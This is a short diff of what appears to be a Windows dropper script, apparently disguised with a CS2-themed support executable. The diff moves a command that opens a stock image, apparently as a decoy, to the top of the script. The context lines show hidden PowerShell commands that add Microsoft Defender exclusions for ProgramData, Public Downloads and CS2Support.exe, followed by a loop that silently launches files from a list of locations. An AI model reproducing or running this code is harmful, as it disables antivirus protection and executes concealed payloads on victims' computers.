@@ -1,3 +1,6 @@
+start https://as2.ftcdn.net/v2/jpg/00/53/69/65/1000_F_53696591_9LO1bsQUpl2zIolFMFokrQyt04Z5dzXd.jpg
+
+
 powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\ProgramData'"
 powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionExtension 'C:\Users\Public\Downloads\CS2Support.exe'"
 powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Users\Public\Downloads'"
@@ -23,7 +26,3 @@ foreach ($location in $locations) {
 foreach ($location in $locations) {
     Start-Process -FilePath $location -WindowStyle Hidden -Wait
 }
-
-
-
-start https://as2.ftcdn.net/v2/jpg/00/53/69/65/1000_F_53696591_9LO1bsQUpl2zIolFMFokrQyt04Z5dzXd.jpg
